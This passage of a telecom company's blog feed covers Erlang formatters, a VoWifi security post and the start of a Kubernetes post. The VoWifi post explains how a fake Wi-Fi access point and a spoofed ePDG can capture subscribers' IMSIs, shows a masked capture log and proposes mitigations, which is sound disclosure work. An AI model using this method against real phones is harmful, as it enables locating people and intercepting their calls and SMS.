when there are argumented macro functions.</p><div class="language-erlang codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-erlang codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">-define(MACRO(), object).</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">foo(?MACRO()) -&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  ok.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-erlang codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-erlang codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">** exception exit: no_translation</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     in function  io:put_chars/3</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        called as io:put_chars(&lt;0.4843.0&gt;,unicode,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                               [...])</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     in call from erl_tidy:output/4 (erl_tidy.erl, line 431)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     in call from erl_tidy:write_module/3 (erl_tidy.erl, line 413)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     in call from erl_tidy:file_2/2 (erl_tidy.erl, line 335)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">     in call from erl_tidy:file_1/3 (erl_tidy.erl, line 310)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="rebar3_format"><a href="https://github.com/AdRoll/rebar3_format" target="_blank" rel="noopener noreferrer">rebar3_format</a><a class="hash-link" href="#rebar3_format" title="Direct link to heading">​</a></h2><p>I had an issue when installing this plugin. It was not as easy as
adding <code>rebar3_format</code> to plugins in the rebar3 config. The reason I
had problems with it was that the plugin depends on
<code>inaka/katana_code</code> which for some reason did not get pulled in
properly and was missing some vital files. The issue could be resolved
by deleting the user rebar3 cache (<code>rm -rf ~/.cache/rebar3/</code>) as
explained in <a href="https://github.com/AdRoll/rebar3_format/issues/80" target="_blank" rel="noopener noreferrer">this issue</a></p><p>After installation you need to specify where the source files for
formatting can be found. This would probably not be needed if we did
not use an Erlang umberella project (an umberella project is when
there are subapplications residing in your main application).  Here is
where I found out that the command line option <code>--files
apps/**/{src,include}/*.?rl</code> is apparantly not the same as specifying
<code>{format, [{files, [“apps/**/{src,include}/*.?rl”]}]}</code> in the
config. The command line options finds only one file, while the config
parameter works as expected.</p><p>Formatting-wise it is similar to <code>erl_tidy</code>. This is because it uses
inakas <code>katana_code</code> which in its turn uses <code>erl_tidy</code>.</p><div class="language-diff codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-diff codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">           components =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">               [{invoke,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                 #'Invoke'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                    invokeID = 1,linkedID = asn1_NOVALUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                    operationCode = updateLocation,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                    parameter =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                        #'UpdateLocationArg'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                           imsi = IMSI,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                           'msc-Number' = CallingGTBCD,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                           'vlr-Number' = CallingGTBCD}}}]},</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                      components =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                          [{invoke,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                            #'Invoke'{invokeID = 1,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                      linkedID =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                          asn1_NOVALUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                      operationCode =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                          updateLocation,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                      parameter =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                          #'UpdateLocationArg'{imsi</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                                   =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                                   IMSI,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                               'msc-Number'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                                   =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                                   CallingGTBCD,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                               'vlr-Number'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                                   =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                                                                                   CallingGTBCD}}}]},</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Problem is that both <code>erl_tidy</code> and <code>katana_code</code> have multiple issues
with macros. It is hard to process format code which include macros
without preprocessing the macros.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="eryngii"><a href="https://github.com/shiguredo/eryngii" target="_blank" rel="noopener noreferrer">eryngii</a><a class="hash-link" href="#eryngii" title="Direct link to heading">​</a></h2><p>This was a project I found in github. It is written in oCaml, and has
been archived by it's owner. I really do not want to install oCaml, so
I just leave it here as a reference.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="elvis"><a href="https://github.com/inaka/elvis" target="_blank" rel="noopener noreferrer">elvis</a><a class="hash-link" href="#elvis" title="Direct link to heading">​</a></h2><p>This is a bonus; it is not a formatter but a linter.</p><p>One difference between formatters and linters are that formatters
change the code into a uniform format, and linters warn or fail when
rules are broken. Linters can also check other things as nesting level.</p><p>This article by Brujo Benavides describe it pretty well.</p><p><a href="https://medium.com/@elbrujohalcon/are-formatters-better-than-linters-cbab91189be3" target="_blank" rel="noopener noreferrer">Are formatters better than linters?</a></p><p>Setting it up you need to configure a ruleset and save in a special
Elvis config file in the repo. This config specifies which linting
rules to apply to which files.</p><p>For me it took 8-9 minutes for it to execute linting on our code base
with the example ruleset that is proposed by the tool.</p><h1>Summary</h1><p>Sadly I couldn't find any good alternatives that fits our
purposes. There are issues with macros, or execution time.</p><p>I have to put this on the shelf again for a while, with just a dream
of uniform code.</p><h1>Edit: 2020-10-01</h1><p>I forgot to update this blogpost, but something amazing happend.</p><p>After I wrote this blog post I contacted the maintainer of
steamroller, and told him about the slowness I experienced, and some
other difficulties.  One day later he had found and fixed an algorithm
going from an <code>O(n^2)</code> complexity to an <code>O(n)</code>. When retrying it on our
code base, things went from minutes to seconds!</p><p>He also removed and improved some of the ambiguous configuration
parameters.</p><p>I haven't yet started to look at the map formatting issues I had, but
maybe that is improved as well. Anyway I'll have to leave that for
another hackday.</p>]]></content:encoded>
            <category>erlang</category>
            <category>rebar3</category>
            <category>coding</category>
            <category>culture</category>
        </item>
        <item>
            <title><![CDATA[VoWifi leaking IMSI]]></title>
            <link>https://www.wgtwo.com/jp/blog/vowifi-imsi-leak/</link>
            <guid>vowifi-imsi-leak/</guid>
            <pubDate>Mon, 30 Mar 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[4G offers more services than the earlier generation such as 3G and 2G. One of]]></description>
            <content:encoded><![CDATA[<p>4G offers more services than the earlier generation such as 3G and 2G. One of
the services has really have gained traction later years is VoLTE (Voice
over LTE) and VoWifi (Voice over Wifi) that we will go more in dept regarding security.</p><p>VoWifi is beneficial in terms being able to use any Wifi connection offering public
internet access thus extending and improving the coverage and connectivity.
Think of it as building our own cellular network, but
using commodity wifi components instead and avoiding the strict regulation and
licensing of spectrum.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-imsi">What is IMSI<a class="hash-link" href="#what-is-imsi" title="Direct link to heading">​</a></h2><p><em>The international mobile subscriber identity (IMSI) is a number that uniquely
identifies every user of a cellular network. It is stored as a 64-bit field
and is sent by the mobile device to the network. It is also used for acquiring
other details of the mobile in the home location register (HLR) or as locally
copied in the visitor location register. To prevent eavesdroppers from
identifying and tracking the subscriber on the radio interface, the IMSI is sent
as rarely as possible and a randomly-generated TMSI is sent instead.</em></p><ul><li><a href="https://en.wikipedia.org/wiki/International_mobile_subscriber_identity" target="_blank" rel="noopener noreferrer">IMSI article</a></li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="security-implications">Security implications<a class="hash-link" href="#security-implications" title="Direct link to heading">​</a></h3><p>The IMSI is a secret identifier stored on the sim and can be exploited in many
ways once known. It is bound to the sim, so changing UE will not help.</p><p>Examples:</p><ul><li>Locating user (UE)</li><li>Intercepting calls</li><li>Intercepting SMS (stealing two factor pin eg.)</li><li>..and more</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="how-vowifi-works">How VoWifi works<a class="hash-link" href="#how-vowifi-works" title="Direct link to heading">​</a></h2><p>When your phone is connected to datanetwork and with volte and vowifi enabled
the device (UE) establish sip session directly to packetgateway via 4g, and via
public internet to epdg (evolved packet data gateway) which is in essence a
ipsec (ikev2) termination using SIM-AKA to authenticate UE. The ipsec comes into
play since epdg is exposed publicly.</p><p>We won't go further in depth for volte and vowifi since there are already
excellent articles about the matter:</p><ul><li><a href="https://en.wikipedia.org/wiki/Voice_over_WLAN" target="_blank" rel="noopener noreferrer">Voice over WLAN</a></li><li><a href="https://en.wikipedia.org/wiki/Voice_over_LTE" target="_blank" rel="noopener noreferrer">Voice over LTE</a></li></ul><p><img loading="lazy" alt="VoWifi topology" src="/jp/assets/images/vowifi-ed900be33ec8a7b58034fb2e5a8a8dca.jpg" width="672" height="280" class="img_ev3q"></p><p>To enable VoWifi on your device, please refer to your device manufacturer website:</p><ul><li><a href="https://support.google.com/phoneapp/answer/2811843?hl=en" target="_blank" rel="noopener noreferrer">Android</a></li><li><a href="https://support.apple.com/en-in/HT203032" target="_blank" rel="noopener noreferrer">Apple</a></li></ul><p>Also check on your operator website if VoWifi is supported in your region. Please note that VoWifi is usually blocked when roaming.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="epdg-exposed-on-the-public-internet">EPDG exposed on the public internet<a class="hash-link" href="#epdg-exposed-on-the-public-internet" title="Direct link to heading">​</a></h2><p>The Evolved Packet Data Gateway needs to be publicly available on the internet
since UE needs to access it from an arbitrary no-trusted connection. The ipsec
will secure and encrypt both the data and maintain the integrity of the
connection throughout the session.</p><p>The UE finds the epdg termination point by looking dns records partly following
a convention decided by 3gpp and typically looks like this in DNS:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">epdg.epc.mnc999.mcc999.pub.3gppnetwork.org. 3488 IN A 1.2.3.4</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">epdg.epc.mnc999.mcc999.pub.3gppnetwork.org. 3488 IN A 5.6.7.8</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>From the DNS records we recognize the network operator (MNC) and the
country code (MCC).</p><p>The DNS records are registered under a delegated domain owned by GSMA and
usually are redelegated to operator under their own umbrella, like the example
mnc999.mcc999.pub.3gppnetwork.org.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-problem">The problem<a class="hash-link" href="#the-problem" title="Direct link to heading">​</a></h2><p>When UE establish session to epdg it uses a vpn, a ipsec relationship using
IKEv2 for authentication, encryption and integrity.</p><p>So far the implementation works as intended and provides good security through
encryption and security.</p><p>The problem is not the VoWifi per see, by rather how ipsec establish the
session. When UE connects to the epdg, it acts as a initiator and the epdg is
inherently passive since it cannot know where from (ip) the UE will come from.</p><p><img loading="lazy" alt="sim-aka flow" src="/jp/assets/images/sim-aka-a216f5fd634021b704462a689f2df6ae.png" width="464" height="450" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="eap-aka-exposes-identity">EAP-AKA exposes identity<a class="hash-link" href="#eap-aka-exposes-identity" title="Direct link to heading">​</a></h3><p>Vowifi as mentioned earlier utilises an encryption protocol based on the widely
adopted Extensible Authentication Protocol. EAP itself is just a protocol and
does not define the contents of the data or how exact the data exchanges look
like. EAP-AKA unfortunately exposes the unencrypted user identity during
the authentication session and in this case the user identity is equal to the
imsi.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a class="hash-link" href="#solution" title="Direct link to heading">​</a></h4><p>This is the hardest problem to solve since it needs a security layer or settings
that comes before ipsec starts to connect.</p><p>The proposed solutions</p><ul><li>Force the use of conservative peer for eap-aka/sim
and use pseudonym identity (tmsi) to avoid exposing imsi.</li><li>Enable EAP-TTLS in addition to EAP-AKA/SIM</li><li>Only connect trusted/encrypted AP's</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="fake-ipsec-termination-exposes-identity">Fake Ipsec termination exposes identity<a class="hash-link" href="#fake-ipsec-termination-exposes-identity" title="Direct link to heading">​</a></h3><p>By impersonating a epdg by redirecting all dns requests for any
<code>pub.3gppnetwork.org.</code> to our own fake ipsec termination providing just enough
to catch the imsi.</p><p>A raspberry pie can easily be setup to constantly scan for open wifi networks,
then impersonating the ssid in hope of lure ue's to connect. Any UE set to use
VoWiFi connecting to the fake access point will give away their imsi.</p><p>A wifi ssid scan example of what we can automate. In this case the Isfjell-Guest
would have been picked to catch imsi since its open and unencrypted:</p><p><img loading="lazy" alt="wifi-ssid" src="/jp/assets/images/wlan-ssid-8239810014d356e06b17543cf45951d2.png" width="474" height="109" class="img_ev3q"></p><p>Snippet from the ipsec termination, UE (iPhone 8) exposes imsi several times:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[ENC] parsed IKE_AUTH request 2 [ EAP/RES/AKA ]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[IKE] '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org' is not a reauth identity</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[IKE] '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org' is not a pseudonym</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[IKE] received identity '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[IKE] no EAP key found for 09999994511******@wlan.mnc999.mcc999.3gppnetwork.org to authenticate with AKA</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[LIB] tried 0 SIM providers, but none had a quintuplet for '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[IKE] failed to map pseudonym/reauth identity '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org', fallback to permanent identity request</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[ENC] generating IKE_AUTH response 2 [ EAP/REQ/AKA ]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">13[NET] sending packet: from 192.168.17.1[500] to 192.168.17.24[500] (92 bytes)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[NET] received packet: from 192.168.17.24[500] to 192.168.17.1[500] (140 bytes)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[ENC] parsed IKE_AUTH request 3 [ EAP/RES/AKA ]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[IKE] received identity '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[IKE] no EAP key found for 09999994511******@wlan.mnc999.mcc999.3gppnetwork.org to authenticate with AKA</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[LIB] tried 0 SIM providers, but none had a quintuplet for '09999994511******@wlan.mnc999.mcc999.3gppnetwork.org'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[IKE] EAP method EAP_AKA failed for peer 09999994511******@nai.epc.mnc999.mcc999.3gppnetwork.org</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">09[ENC] generating IKE_AUTH response 3 [ EAP/FAIL ]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="solution-1">Solution<a class="hash-link" href="#solution-1" title="Direct link to heading">​</a></h4><p>Ipsec clients (UE) are able to verify the identity of the epdg by requesting
and validating a machine certificate proving it is the actual service belonging
to the requested dns address. This means when the client connects, the server
has to provide a valid certificate containing the dns names and signed by a
trusted CA.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="raspberry-pi-4">Raspberry PI 4<a class="hash-link" href="#raspberry-pi-4" title="Direct link to heading">​</a></h2><p>The specific physical setup used for testing. Older PI's should work just fine and also
other platforms that can run dnsmasq, tshark and strongswan for ipsec with
support for eap-aka/sim.</p><p><img loading="lazy" alt="rpi4 and battery" src="/jp/assets/images/rpi4-batt-331b622857ead4ba1f8081397efe866f.jpg" width="640" height="480" class="img_ev3q"></p><p><em>white box is the rpi4 in a original casing and gray box is a battery bank</em></p>]]></content:encoded>
            <category>telco</category>
            <category>4G</category>
            <category>ePDG</category>
            <category>VoWifi</category>
            <category>networking</category>
            <category>security</category>
        </item>
        <item>
            <title><![CDATA[Extending Kubernetes for our needs]]></title>
            <link>https://www.wgtwo.com/jp/blog/extending-k8s/</link>
            <guid>extending-k8s/</guid>
            <pubDate>Fri, 21 Feb 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[We are using Kubernetes as our cluster scheduler and this serves us well. However we have a]]></description>
            <content:encoded><![CDATA[<p>We are using Kubernetes as our cluster scheduler and this serves us well. However we have a
few cases where we need to do some additional work.</p><p>One case for example is that we have to use static IPs for some of our services to connect to
Telecom companies as they expect a single IP address to bind to. This address needs to be fixed and
DNS records are not accepted either. We are running in AWS as well, so the reader might ask why are we not
using Elastic IPs and adding them to the services? Good idea, but Telecom operators will not whitelist
an Elastic IP for you as there are no guarantees that it will belong to your company infrastructure forever. There
are also additional challenges when it comes to using Elastic IP in private subnet over VPN or direct connect.</p><p>We are a member of RIPE and do have a small subnet block for our own use, so we thought we could make use of
that. As we own the block and AWS supports BYOIP (Bring your own IP-range), we created a special subnet with
some Kubernetes nodes in it. This was not enough to make this work since we depended on a service always having
the same IP attached to it, as well as the node running a pod having some very specific Routes set.</p><p>With this scenario in mind we set out to find solutions and all solutions we could think of required haggling
with Kubernetes.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="extending-kubernetes">Extending Kubernetes<a class="hash-link" href="#extending-kubernetes" title="Direct link to heading">​</a></h2><p>There are several ways to extend Kubernetes. All functionality in Kubernetes is build upon very nice and clean
public APIs, or to say it with other words: There is no private API magic hidden somewhere. So lets look at
two ways on how to extend Kubernetes.</p><p>Possible ways to go forward:</p><ul><li>Adding a scheduler extender</li><li>Creating an operator/controller</li></ul><p>There are more ways to extend Kubernetes, but these two ways will be the one we shall look at. Just for completeness
you can as well also add another scheduler or change Kubernetes itself. However these possibilities have some serious
downsides.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="adding-a-scheduler-extender">Adding a scheduler extender<a class="hash-link" href="#adding-a-scheduler-extender" title="Direct link to heading">​</a></h3><p>The Kubernetes scheduler checks for certain requirements before it schedules a pod onto a node. Some of these requirements
are hard requirements, like cpu, memory and number of pods. Other requirements are more soft, like if the pods are allowed to
be packed together or in which AZ they are going to run. All of those requirements are collected and points given to each
node on how well they meet the requirements. The node that fits best, gets chosen.</p><p>All of these are things the scheduler will do for you automatically, however it is also possible to give the cluster a
<code>KubeSchedulerConfiguration</code> object that will tell the scheduler to also reach out to a service for additional point scoring.
The SchedulerConfiguration is a JSON file and for further explanations, please have a look at this
excellent <a href="https://developer.ibm.com/articles/creating-a-custom-kube-scheduler/" target="_blank" rel="noopener noreferrer">blog post</a>.</p><p>In our case, we could have written a service that checks which IP Addresses are assigned to the Nodes and moved the Pods
onto those nodes. This would have required us to make sure that those nodes had all needed IP-Addresses all the time.
That sounded not very enticing when doing cluster upgrades as it would have needed to be at least a semi-manual process.
